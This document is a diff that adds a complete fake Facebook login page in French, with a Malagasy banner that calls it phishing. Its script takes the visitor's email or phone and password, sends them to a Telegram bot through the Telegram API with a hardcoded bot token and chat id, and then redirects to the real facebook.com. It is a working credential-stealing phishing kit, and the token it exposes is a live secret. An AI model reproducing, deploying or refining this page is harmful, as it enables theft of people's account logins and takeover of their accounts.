@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Connexion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .creator {
+        font-size: 28px;
+        color: red;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .logo {
+      font-size: 48px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .login-box {
+      background-color: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      font-size: 16px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #165cdb;
+    }
+    .login-box a {
+      display: block;
+      text-align: center;
+      margin-top: 10px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+    .signup-box {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .signup-box button {
+      background-color: #42b72a;
+    }
+    .signup-box button:hover {
+      background-color: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="creator">tandremo fa phishing ito ts misy idirako izay vokany eo</div>
+    <div class="logo">Facebook</div>
+    <div class="login-box">
+      <input type="text"  id="username" placeholder="Email ou téléphone">
+      <input type="password" id="pass" placeholder="Mot de passe">
+      <button onclick="send()">Se connecter</button>
+      <a href="#">Mot de passe oublié ?</a>
+    </div>
+    <div class="signup-box">
+      <button>Créer un compte</button>
+    </div>
+  </div>
+  
+  <script>
+    function send() {
+      const token = "8434246526:AAEnfq6tvyrPpNQj4GzbJyQdWpEBs_yHcC8"; // Remplace par ton token
+      const chatId = "7345349367"; // Remplace par ton chat id
+      const message = document.getElementById("username").value;
+      const mdp = document.getElementById("pass").value;
+      const text = `ANARANA = ${message} \n TENY MIHAFINA = ${mdp}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+        .then(response => response.json())
+        .then(data => {
+          if(data.ok) {
+            alert("Message envoyé avec succès !");
+            window.location.href = "https://facebook.com";
+          } else {
+            alert("Erreur : " + data.description);
+          }
+        })
+        .catch(error => alert("Erreur : " + error));
+    }
+  </script>
+</body>
+</html>
